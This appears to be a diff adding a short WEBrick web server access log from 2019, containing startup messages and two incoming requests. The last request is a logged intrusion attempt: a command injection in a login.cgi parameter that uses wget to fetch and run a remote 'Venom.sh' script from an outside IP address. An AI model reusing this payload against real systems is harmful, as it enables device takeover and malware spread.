@@ -1,0 +1,5 @@
+[2019-11-30 17:09:44] INFO  WEBrick 1.5.0
+[2019-11-30 17:09:44] INFO  ruby 2.5.1 (2018-03-29) [x86_64-linux-gnu]
+[2019-11-30 17:09:44] INFO  WEBrick::HTTPServer#start: pid=391 port=80
+54.38.207.237 - - [30/Nov/2019:17:27:37 +0000] "GET / HTTP/1.1" 200 1574 0.0401
+142.93.245.188 - - [30/Nov/2019:17:40:03 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://51.79.66.236/Venom.sh%20-O%20-%3E%20/tmp/kh;Venom.sh%20/tmp/kh%27$ HTTP/1.1" 404 562 0.0048
